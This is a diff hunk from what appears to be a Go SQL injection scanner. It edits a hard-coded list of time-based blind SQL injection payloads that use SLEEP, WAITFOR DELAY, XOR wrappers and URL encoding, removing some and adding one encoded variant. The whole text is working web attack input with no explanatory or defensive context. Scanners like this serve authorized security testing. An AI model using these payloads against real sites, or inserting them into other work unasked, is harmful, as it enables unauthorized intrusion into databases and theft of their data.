@@ -116,16 +116,12 @@ func main() {
 	payloads := []string{
 		"if(now()=sysdate()%2Csleep(tempoSQLi)%2C0)",	
 		"/if(now()=sysdate()%2Csleep(tempoSQLi)%2C0)",			
-		"?id=(SELECT(0)FROM(SELECT(SLEEP(tempoSQLi)))a)",
-		"?id=if(now()=sysdate(),SLEEP(tempoSQLi),0)",
 		"1'XOR(if(now()=sysdate()%2Csleep(tempoSQLi)%2C0))XOR'Z",
-		"?id=1'XOR(if(now()=sysdate()%2Csleep(tempoSQLi)%2C0))XOR'Z",
 		"1'XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR'Z",
 		"';WAITFOR DELAY '0:0:tempoSQLi'--",
 		"'XOR(SELECT(0)FROM(SELECT(SLEEP(tempoSQLi)))a)XOR'Z",
 		"/'XOR(SELECT(0)FROM(SELECT(SLEEP(tempoSQLi)))a)XOR'Z",
-		"%27%20AND%20SLEEP(tempoSQLi)%23",
-		"') or SLEEP(tempoSQLi)--",
+		"')%20or%20SLEEP(tempoSQLi)--",
 		"'%20AND%20SLEEP(tempoSQLi)%23",
 		"'%20AND%20SLEEP(tempoSQLi)--",	
 	}
